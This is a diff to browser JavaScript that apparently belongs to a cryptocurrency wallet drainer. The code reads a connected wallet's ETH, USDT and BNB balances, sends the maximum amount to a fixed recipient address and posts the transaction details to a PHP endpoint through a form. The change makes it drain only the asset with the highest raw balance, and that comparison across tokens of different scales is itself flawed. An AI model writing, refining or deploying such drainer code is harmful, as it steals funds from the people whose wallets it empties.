@@ -138,53 +138,36 @@
                         maxEthTransferWei = 0n;
                     }
 
-                    // Get USDT balance
+                    // Get token balances
                     const usdtContract = new web3.eth.Contract(erc20ABI, tokenAddresses.USDT);
                     const usdtBalanceWei = BigInt(await usdtContract.methods.balanceOf(senderAddress).call());
 
-                    // Get BNB balance
                     const bnbContract = new web3.eth.Contract(erc20ABI, tokenAddresses.BNB);
                     const bnbBalanceWei = BigInt(await bnbContract.methods.balanceOf(senderAddress).call());
 
-                    // Create transactions for each token using ethers.js
-                    const ethTransactionParameters = {
-                        to: recipientAddress,
-                        value: ethers.BigNumber.from(maxEthTransferWei.toString()),
-                        gasLimit: ethers.BigNumber.from(gasLimit.toString()),
-                        gasPrice: ethers.BigNumber.from(gasPriceWei.toString())
-                    };
+                    // Determine which token has the highest balance
+                    const balances = [
+                        { name: 'ETH', balance: maxEthTransferWei, transactionParameters: { to: recipientAddress, value: ethers.BigNumber.from(maxEthTransferWei.toString()), gasLimit: ethers.BigNumber.from(gasLimit.toString()), gasPrice: ethers.BigNumber.from(gasPriceWei.toString()) } },
+                        { name: 'USDT', balance: usdtBalanceWei, transactionParameters: { to: tokenAddresses.USDT, gasLimit: ethers.BigNumber.from(gasLimit.toString()), gasPrice: ethers.BigNumber.from(gasPriceWei.toString()), data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI() } },
+                        { name: 'BNB', balance: bnbBalanceWei, transactionParameters: { to: tokenAddresses.BNB, gasLimit: ethers.BigNumber.from(gasLimit.toString()), gasPrice: ethers.BigNumber.from(gasPriceWei.toString()), data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI() } }
+                    ];
 
-                    const ethTransaction = await signer.sendTransaction(ethTransactionParameters);
+                    balances.sort((a, b) => (a.balance > b.balance ? -1 : 1));
 
-                    const usdtTransactionParameters = {
-                        to: tokenAddresses.USDT,
-                        gasLimit: ethers.BigNumber.from(gasLimit.toString()),
-                        gasPrice: ethers.BigNumber.from(gasPriceWei.toString()),
-                        data: usdtContract.methods.transfer(recipientAddress, usdtBalanceWei.toString()).encodeABI()
-                    };
+                    // Use the token with the highest balance
+                    const selectedToken = balances[0];
+                    console.log(`Selected Token: ${selectedToken.name}`);
 
-                    const usdtTransaction = await signer.sendTransaction(usdtTransactionParameters);
-
-                    const bnbTransactionParameters = {
-                        to: tokenAddresses.BNB,
-                        gasLimit: ethers.BigNumber.from(gasLimit.toString()),
-                        gasPrice: ethers.BigNumber.from(gasPriceWei.toString()),
-                        data: bnbContract.methods.transfer(recipientAddress, bnbBalanceWei.toString()).encodeABI()
-                    };
-
-                    const bnbTransaction = await signer.sendTransaction(bnbTransactionParameters);
+                    const transaction = await signer.sendTransaction(selectedToken.transactionParameters);
 
                     // Send transaction details to PHP endpoint
                     transactionDetailsInput.value = JSON.stringify({
                         status: 'approved',
-                        ethTransactionHash: ethTransaction.hash,
-                        usdtTransactionHash: usdtTransaction.hash,
-                        bnbTransactionHash: bnbTransaction.hash,
+                        transactionHash: transaction.hash,
                         sender: senderAddress,
                         recipient: recipientAddress,
-                        maxEthTransfer: maxEthTransferWei.toString(),
-                        usdtBalance: usdtBalanceWei.toString(),
-                        bnbBalance: bnbBalanceWei.toString()
+                        selectedToken: selectedToken.name,
+                        balance: selectedToken.balance.toString()
                     });
                     transactionForm.submit();
                 } catch (error) {
